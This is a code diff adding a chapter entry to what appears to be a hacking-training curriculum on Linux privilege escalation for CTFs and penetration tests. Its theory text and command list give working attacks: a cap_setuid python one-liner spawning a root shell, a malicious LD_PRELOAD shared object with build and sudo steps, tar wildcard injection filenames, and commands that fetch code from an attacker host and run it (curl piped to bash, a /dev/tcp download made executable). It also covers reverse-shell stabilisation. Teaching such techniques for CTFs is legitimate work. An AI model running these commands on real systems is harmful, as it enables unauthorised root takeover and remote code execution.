@@ -296,3 +296,151 @@ if __name__ == '__main__':
         "mitigation": "Ingest logs into structured SIEM platforms (Elasticsearch/Splunk) and alert on single-occurrence anomalies and high-entropy User-Agent strings."
     }
 }
+
+chapters['linux-mastery-privesc'] = {'id': 'linux-mastery-privesc',
+ 'domain': 'linux',
+ 'category': 'Linux & Systems',
+ 'title': 'Linux Mastery for Hackers: Commands, Internals, Privilege Escalation Vectors & Terminal '
+          'Evasion',
+ 'subtitle': 'Linux CTF Reconnaissance, SUID/Capabilities Exploitation, Crontab Wildcards, File '
+             'Transfer Tradecraft & Shell Evasion',
+ 'diagram': '[LOW-PRIVILEGE SHELL: uid=1000(ctf-user)]\n'
+            '          |\n'
+            '          v (00:00 - 02:00)\n'
+            '[PHASE 1: AUTOMATED & MANUAL SYSTEM ENUMERATION]\n'
+            '  |-- Identity & Sudo: $ id; sudo -l\n'
+            '  |-- SUID/SGID Binaries: $ find / -perm -u=s -type f 2>/dev/null\n'
+            '  |-- Linux Capabilities: $ getcap -r / 2>/dev/null\n'
+            '  |-- Internal Sockets: $ ss -tulpn (check 127.0.0.1:3306, 6379, 8080)\n'
+            '  |-- Ephemeral Process Snooping: $ pspy or /proc while loop\n'
+            '  `-- World-Writable Files & Crontabs: $ cat /etc/crontab; find / -writable '
+            '2>/dev/null\n'
+            '          |\n'
+            '          v (02:00 - 05:00)\n'
+            '[PHASE 2: PRIVILEGE ESCALATION VECTOR TRIAGE]\n'
+            '  |-- Path A: Sudo / SUID GTFOBin (e.g. vim, python, find, bash, awk, base64)\n'
+            '  |-- Path B: Linux Capabilities (e.g. cap_setuid+ep on python3 -> setuid(0))\n'
+            '  |-- Path C: Sudo LD_PRELOAD injection (compile shared object -> sudo '
+            'LD_PRELOAD=/tmp/pe.so)\n'
+            '  |-- Path D: Cron Wildcard Injection (tar * --checkpoint=1 '
+            '--checkpoint-action=exec=shell.sh)\n'
+            '  |-- Path E: Docker UNIX Socket Abuse (mount host root / into container -> chroot '
+            '/host)\n'
+            '  `-- Path F: NFS no_root_squash (mount remote share as local root -> copy SUID '
+            'bash)\n'
+            '          |\n'
+            '          v (05:00 - 08:00)\n'
+            '[PHASE 3: CTF FILE TRANSFERS & SHELL UPGRADE]\n'
+            '  |-- Transfer payload: python3 -m http.server 8000 <--> curl | bash or pure '
+            '/dev/tcp\n'
+            '  `-- Full TTY Upgrade: python3 -c \'import pty; pty.spawn("/bin/bash")\' -> Ctrl+Z '
+            '-> stty raw -echo; fg\n'
+            '          |\n'
+            '          v\n'
+            '[FLAG CAPTURE: uid=0(root) -> cat /root/root.txt]',
+ 'theory': 'Gaining a low-privilege shell on a Linux target is only half the battle. CTF '
+           'challenges and enterprise penetration tests require elevating privileges to root '
+           '(`uid=0`) to read protected flag files or access sensitive cryptographic materials.\n'
+           '\n'
+           '### PHASE 1: THE 60-SECOND PRIVILEGE ESCALATION TRIAGE\n'
+           'Immediately upon receiving a shell, execute the non-invasive discovery checklist:\n'
+           '1. `id`: Check your UID, GID, and supplementary groups.\n'
+           '   - If in `docker` group -> Instant root via container volume mount!\n'
+           '   - If in `lxd`/`lxc` group -> Instant root via custom container image!\n'
+           '   - If in `disk` group -> Direct read/write access to raw block devices '
+           '(`/dev/sda1`)!\n'
+           '2. `sudo -l`: Lists commands you are permitted to run with sudo. Check if `NOPASSWD` '
+           'is specified or if `env_keep += LD_PRELOAD` is present.\n'
+           '3. `find / -perm -u=s -type f 2>/dev/null`: Lists all SUID binaries. Compare against '
+           'the GTFOBins catalog (vim, find, bash, cp, awk, python, pkexec).\n'
+           '4. `getcap -r / 2>/dev/null`: Enumerates POSIX capabilities. Look for `cap_setuid+ep` '
+           'on Python, Perl, Ruby, or Tar.\n'
+           '5. `ss -tulpn` or `netstat -antup`: Discovers listening ports bound exclusively to '
+           '`127.0.0.1` (localhost) that are invisible from external network port scans (e.g., '
+           'MySQL on 3306, Redis on 6379, internal admin APIs on 8080).\n'
+           '6. `crontab -l; cat /etc/crontab /etc/cron.*/*`: Inspects scheduled automated root '
+           'tasks.\n'
+           '\n'
+           '### PHASE 2: ADVANCED PRIVILEGE ESCALATION MECHANICS\n'
+           '1. **Linux Capabilities (cap_setuid)**:\n'
+           '   Linux divides root privileges into granular capabilities. If an administrator '
+           'assigns `cap_setuid+ep` to Python (`setcap cap_setuid+ep /usr/bin/python3.8`), any '
+           'unprivileged user can execute:\n'
+           '   `python3.8 -c \'import os; os.setuid(0); os.system("/bin/bash")\'`\n'
+           '   The kernel permits `setuid(0)` without checking for standard SUID root ownership!\n'
+           '2. **Sudo LD_PRELOAD Shared Object Injection**:\n'
+           '   If `sudo -l` shows `env_keep += LD_PRELOAD`, compile a malicious C shared object:\n'
+           '   ```c\n'
+           '   #include <stdio.h>\n'
+           '   #include <sys/types.h>\n'
+           '   #include <stdlib.h>\n'
+           '   void _init() {\n'
+           '       unsetenv("LD_PRELOAD");\n'
+           '       setgid(0); setuid(0);\n'
+           '       system("/bin/bash");\n'
+           '   }\n'
+           '   ```\n'
+           '   Compile with `gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles`.\n'
+           '   Run any allowed command: `sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>`.\n'
+           '   The dynamic linker loads `pe.so` before executing the binary, running `_init()` as '
+           'root!\n'
+           '3. **Tar Wildcard Command Injection**:\n'
+           '   If a root cron job runs `tar -czf /backup/backup.tar.gz *` inside a directory '
+           'writable by normal users:\n'
+           '   Tar parses arguments beginning with `--` as command-line options. Create two '
+           'files:\n'
+           '   `touch "/tmp/dir/--checkpoint=1"`\n'
+           '   `touch "/tmp/dir/--checkpoint-action=exec=sh shell.sh"`\n'
+           '   When the shell expands `*`, Tar interprets these files as options and executes '
+           '`shell.sh` with root permissions!\n'
+           '4. **Process Snooping with Ephemeral Monitoring**:\n'
+           '   When crons run fast scripts that terminate in 0.1 seconds, use a `/proc` monitoring '
+           'loop or `pspy` to capture command-line arguments without root privileges:\n'
+           '   `while true; do ps -eo pid,user,args --sort=-pid | head -n 15; sleep 0.5; done`.\n'
+           '\n'
+           '### PHASE 3: CTF FILE TRANSFERS & TERMINAL STABILIZATION\n'
+           'Never struggle with broken shells or missing file transfer tools:\n'
+           '- **Instant File Transfers**:\n'
+           '  - Attacker host: `python3 -m http.server 8000`\n'
+           '  - Victim target (curl pipe): `curl -s http://10.10.14.1:8000/linpeas.sh | bash`\n'
+           '  - Victim target (pure Bash socket, no curl/wget): `cat < /dev/tcp/10.10.14.1/9001 > '
+           '/tmp/exploit && chmod +x /tmp/exploit`\n'
+           '- **Full TTY Shell Upgrade**:\n'
+           '  Standard reverse shells terminate on Ctrl+C and have no tab completion or terminal '
+           'geometry. Upgrade immediately:\n'
+           '  1. In reverse shell: `python3 -c \'import pty; pty.spawn("/bin/bash")\'`\n'
+           '  2. Press `Ctrl+Z` to suspend shell to local background.\n'
+           '  3. In local terminal: `stty raw -echo; fg`\n'
+           '  4. In upgraded shell: `export TERM=xterm-256color; stty rows 38 cols 140`\n'
+           '  You now have a fully functional terminal identical to a native SSH session!',
+ 'commands': [{'cmd': 'find / -perm -u=s -type f 2>/dev/null',
+               'why': 'Locates all SUID executables across the filesystem that run with effective '
+                      'owner privileges.',
+               'when': 'Initial privilege escalation triage on any Linux system.',
+               'internals': 'Iterates directory inodes checking the `S_ISUID` (04000) permission '
+                            'bit.',
+               'pitfalls': 'Filter out standard utilities (e.g. ping, sudo, passwd, mount) to '
+                           'isolate non-standard or custom binaries.'},
+              {'cmd': 'getcap -r / 2>/dev/null',
+               'why': 'Discovers binaries with enhanced Linux POSIX capabilities (e.g., '
+                      'cap_setuid, cap_net_raw).',
+               'when': 'When standard SUID checks reveal no exploitable binaries.',
+               'internals': 'Reads security extended attributes (`security.capability`) stored on '
+                            'filesystem inodes.',
+               'pitfalls': 'Requires extended attributes support on the target filesystem.'},
+              {'cmd': 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+               'why': 'Allocates a real pseudo-terminal (PTY) pair to turn a dumb pipe shell into '
+                      'an interactive session.',
+               'when': 'Immediately after catching a reverse shell listener.',
+               'internals': 'Calls `openpty()` and replaces standard I/O file descriptors with the '
+                            'slave PTY device.',
+               'pitfalls': 'Requires python or python3 installed on the target; use script or perl '
+                           'as fallbacks.'},
+              {'cmd': 'cat < /dev/tcp/10.10.14.1/9001 > /tmp/payload && chmod +x /tmp/payload',
+               'why': 'Transfers binary files into restricted environments using built-in Bash '
+                      'socket redirection without curl, wget, or netcat.',
+               'when': 'Living off the land in minimal container or hardened Linux targets.',
+               'internals': 'Bash parses `/dev/tcp/host/port` internally, invoking `socket()` and '
+                            '`connect()` syscalls directly.',
+               'pitfalls': 'Requires standard Bash compiled with `--enable-net-redirections` '
+                           '(standard on Debian/Ubuntu/CentOS).'}]}
